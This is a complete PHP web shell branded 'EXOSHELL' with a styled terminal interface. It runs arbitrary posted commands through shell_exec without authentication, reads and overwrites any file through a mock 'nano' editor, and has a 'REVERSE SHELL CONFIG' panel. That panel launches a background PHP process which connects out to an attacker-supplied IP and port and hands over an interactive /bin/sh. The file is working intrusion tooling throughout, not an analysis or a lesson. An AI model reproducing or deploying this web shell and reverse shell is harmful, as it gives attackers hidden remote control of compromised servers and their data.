<?php
$output = '';
$nanoOutput = '';
$nanoContent = '';
$nanoFilename = '';
$reverseShellStatus = '';

// Handle single-file embedded reverse shell logic
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['trigger_reverse_shell'])) {
    $target_ip = trim($_POST['attacker_ip']);
    $target_port = intval($_POST['attacker_port']);

    if (!empty($target_ip) && $target_port > 0) {
        $reverseShellStatus = "Reverse shell logic successfully activated targeting IP: $target_ip | Port: $target_port";
        
        // Embedded Reverse Shell background execution logic
        $rev_code = '$ip = \'' . $target_ip . '\';';
        $rev_code .= '$port = ' . $target_port . ';';
        $rev_code .= '
        set_time_limit (0);
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = \'uname -a; w; id; /bin/sh -i\';
        $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
        if ($sock) {
            $descriptorspec = array(
               0 => array("pipe", "r"),
               1 => array("pipe", "w"),
               2 => array("pipe", "w")
            );
            $process = proc_open($shell, $descriptorspec, $pipes);
            if (is_resource($process)) {
                stream_set_blocking($pipes[0], 0);
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);
                stream_set_blocking($sock, 0);
                while (1) {
                    if (feof($sock) || feof($pipes[1])) break;
                    $read_a = array($sock, $pipes[1], $pipes[2]);
                    @stream_select($read_a, $write_a, $error_a, null);
                    if (in_array($sock, $read_a)) {
                        $input = fread($sock, $chunk_size);
                        fwrite($pipes[0], $input);
                    }
                    if (in_array($pipes[1], $read_a)) {
                        $input = fread($pipes[1], $chunk_size);
                        fwrite($sock, $input);
                    }
                    if (in_array($pipes[2], $read_a)) {
                        $input = fread($pipes[2], $chunk_size);
                        fwrite($sock, $input);
                    }
                }
                fclose($sock);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }';

        // Execute the reverse shell logic asynchronously in the background
        shell_exec("php -r " . escapeshellarg($rev_code) . " > /dev/null 2>&1 &");

    } else {
        $reverseShellStatus = "Error: Please provide a valid IP address and Port.";
    }
}

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Handle nano commands
    if (strpos(trim($cmd), 'nano ') === 0) {
        $nanoFilename = trim(substr($cmd, 5));
        if (file_exists($nanoFilename)) {
            $nanoContent = htmlspecialchars(file_get_contents($nanoFilename));
        } else {
            $nanoContent = '';
        }
        $nanoOutput = "<div class='nano-editor'><h3>Nano Editor: $nanoFilename</h3>";
        $nanoOutput .= "<form method='POST'><input type='hidden' name='nano_filename' value='$nanoFilename'>";
        $nanoOutput .= "<textarea name='nano_content'>$nanoContent</textarea>";
        $nanoOutput .= "<div class='nano-actions'>";
        $nanoOutput .= "<input type='submit' name='save_nano' value='SAVE' class='nano-button'>";
        $nanoOutput .= "<input type='button' value='CLOSE' class='nano-button nano-close'>";
        $nanoOutput .= "</div></form></div>";
    } 
    // Handle other commands
    else {
        $output = shell_exec($cmd);
    }
}

// Handle nano content save
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_nano'])) {
    $nanoFilename = $_POST['nano_filename'];
    $nanoContent = $_POST['nano_content'];
    file_put_contents($nanoFilename, $nanoContent);
    $output = "File saved: $nanoFilename";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>EXOSHELL</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      background: #000000;
      font-family: 'Space Grotesk', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      padding: 20px;
      position: relative;
    }

    .terminal-container {
      background: #000000;
      border: 1px solid #ffffff;
      width: 100%;
      max-width: 850px;
      padding: 30px;
      position: relative;
      transition: filter 0.3s ease;
    }

    body.modal-active .terminal-container {
      filter: blur(6px);
      pointer-events: none;
    }

    .terminal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 25px;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .terminal-icon {
      width: 28px;
      height: 28px;
      stroke: #ffffff;
      stroke-width: 2;
      fill: none;
    }

    .info-icon-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 20px;
      cursor: pointer;
      padding: 0;
      font-family: 'JetBrains Mono', monospace;
      transition: opacity 0.2s ease;
    }

    .info-icon-btn:hover {
      opacity: 0.7;
    }

    .modal-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      z-index: 999;
      align-items: center;
      justify-content: center;
    }

    .modal-overlay.active {
      display: flex;
    }

    .control-panel {
      background: #000000;
      border: 1px solid #ffffff;
      width: 100%;
      max-width: 360px;
      padding: 25px;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.15);
      position: relative;
    }

    .control-panel h4 {
      font-size: 14px;
      margin-bottom: 15px;
      letter-spacing: 1px;
      border-bottom: 1px solid #333;
      padding-bottom: 8px;
      text-align: center;
    }

    .control-panel input[type="text"] {
      width: 100%;
      background: #000000;
      border: 1px solid #ffffff;
      color: #ffffff;
      padding: 12px;
      font-size: 13px;
      margin-bottom: 12px;
      font-family: 'JetBrains Mono', monospace;
      outline: none;
    }

    .control-panel input[type="text"]:focus {
      background: #111111;
    }

    .modal-actions {
      display: flex;
      gap: 10px;
      margin-top: 5px;
    }

    .activate-btn {
      flex: 1;
      background: #000000;
      color: #ffffff;
      border: 1px solid #ffffff;
      padding: 10px;
      cursor: pointer;
      font-family: 'Space Grotesk', sans-serif;
      font-weight: 600;
      font-size: 12px;
      letter-spacing: 1px;
    }

    .activate-btn:hover {
      background: #ffffff;
      color: #000000;
    }

    .close-modal-btn {
      background: transparent;
      color: #888;
      border: 1px solid #444;
      padding: 10px 15px;
      cursor: pointer;
      font-family: 'Space Grotesk', sans-serif;
      font-weight: 600;
      font-size: 12px;
    }

    .close-modal-btn:hover {
      border-color: #fff;
      color: #fff;
    }

    h2 {
      font-size: 1.5rem;
      color: #ffffff;
      font-weight: 700;
      letter-spacing: 1px;
    }

    form {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    input[type="text"] {
      flex: 1;
      background-color: #000000;
      border: 1px solid #ffffff;
      color: #ffffff;
      font-size: 14px;
      padding: 12px;
      outline: none;
      font-family: 'JetBrains Mono', monospace;
    }

    input[type="text"]:focus {
      border-color: #ffffff;
      background: #111111;
    }

    input[type="submit"] {
      background: #000000;
      color: #ffffff;
      border: 1px solid #ffffff;
      padding: 12px 20px;
      cursor: pointer;
      font-weight: 600;
      font-family: 'Space Grotesk', sans-serif;
    }

    input[type="submit"]:hover {
      background: #ffffff;
      color: #000000;
    }

    h3 {
      margin-top: 15px;
      font-size: 14px;
      color: #ffffff;
      font-weight: 600;
    }

    pre {
      background: #000000;
      color: #ffffff;
      border: 1px solid #ffffff;
      padding: 16px;
      font-size: 13px;
      line-height: 1.5;
      max-height: 300px;
      overflow-y: auto;
      font-family: 'JetBrains Mono', monospace;
    }

    .nano-editor {
      background: #000000;
      border: 1px solid #ffffff;
      padding: 15px;
      margin-top: 15px;
    }

    .nano-editor h3 {
      color: #ffffff;
      border-bottom: 1px solid #ffffff;
      padding-bottom: 8px;
      margin-bottom: 15px;
    }

    .nano-editor textarea {
      width: 100%;
      height: 250px;
      background: #000000;
      color: #ffffff;
      border: 1px solid #ffffff;
      padding: 15px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      resize: vertical;
      outline: none;
    }

    .nano-actions {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      justify-content: flex-end;
    }

    .nano-button {
      background: #000000;
      color: #ffffff;
      border: 1px solid #ffffff;
      padding: 12px 20px;
      cursor: pointer;
      font-weight: 600;
      font-family: 'Space Grotesk', sans-serif;
    }

    .nano-button:hover {
      background: #ffffff;
      color: #000000;
    }

    .command-hint {
      font-size: 12px;
      color: #888888;
      margin-top: 10px;
      text-align: center;
      letter-spacing: 1px;
      font-family: 'JetBrains Mono', monospace;
    }

    ::-webkit-scrollbar {
      width: 4px;
    }

    ::-webkit-scrollbar-thumb {
      background: #ffffff;
    }

    @media (max-width: 600px) {
      form {
        flex-direction: column;
      }

      input[type="submit"], .nano-button {
        width: 100%;
      }
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const infoBtn = document.getElementById('infoTriggerBtn');
      const modalOverlay = document.getElementById('modalOverlay');
      const closeModalBtn = document.getElementById('closeModalBtn');
      const bodyTag = document.body;

      if (infoBtn && modalOverlay) {
        infoBtn.addEventListener('click', function() {
          modalOverlay.classList.add('active');
          bodyTag.classList.add('modal-active');
        });

        closeModalBtn.addEventListener('click', function() {
          modalOverlay.classList.remove('active');
          bodyTag.classList.remove('modal-active');
        });

        modalOverlay.addEventListener('click', function(e) {
          if (e.target === modalOverlay) {
            modalOverlay.classList.remove('active');
            bodyTag.classList.remove('modal-active');
          }
        });
      }

      document.querySelector('.nano-close')?.addEventListener('click', function() {
        document.querySelector('.nano-editor').remove();
      });
      
      document.querySelector('input[name="cmd"]')?.focus();
    });
  </script>
</head>
<body>

  <!-- Centered Modal Overlay with Blur Background -->
  <div class="modal-overlay" id="modalOverlay">
    <div class="control-panel">
      <h4>REVERSE SHELL CONFIG</h4>
      <form method="POST" style="margin: 0; display: flex; flex-direction: column; gap: 10px;">
        <input type="text" name="attacker_ip" placeholder="Attacker IP (e.g. 192.168.x.x)" required />
        <input type="text" name="attacker_port" placeholder="Port (e.g. 4444)" required />
        <div class="modal-actions">
          <input type="submit" name="trigger_reverse_shell" value="CONNECT" class="activate-btn" />
          <button type="button" class="close-modal-btn" id="closeModalBtn">CANCEL</button>
        </div>
      </form>
    </div>
  </div>

  <div class="terminal-container">
    <div class="terminal-header">
      <div class="header-left">
        <svg class="terminal-icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="4 17 10 11 4 5"></polyline>
          <line x1="12" y1="19" x2="20" y2="19"></line>
        </svg>
        <h2>EXOSHELL</h2>
      </div>

      <!-- Pure Icon (ⓘ) Without Box -->
      <button type="button" class="info-icon-btn" id="infoTriggerBtn" title="Reverse Shell Options">ⓘ</button>
    </div>

    <form method="POST">
      <input type="text" name="cmd" placeholder="Enter command here..." autofocus required />
      <input type="submit" value="RUN" />
    </form>
    <div class="command-hint">THE INTELEON404</div>

    <?php if (!empty($reverseShellStatus)): ?>
      <h3>Status:</h3>
      <pre><?= htmlspecialchars($reverseShellStatus); ?></pre>
    <?php endif; ?>

    <?php if (!empty($nanoOutput)): ?>
      <?= $nanoOutput ?>
    <?php endif; ?>

    <?php if (!empty($output)): ?>
      <h3>Output:</h3>
      <pre><?= htmlspecialchars($output); ?></pre>
    <?php endif; ?>
  </div>
</body>
</html>
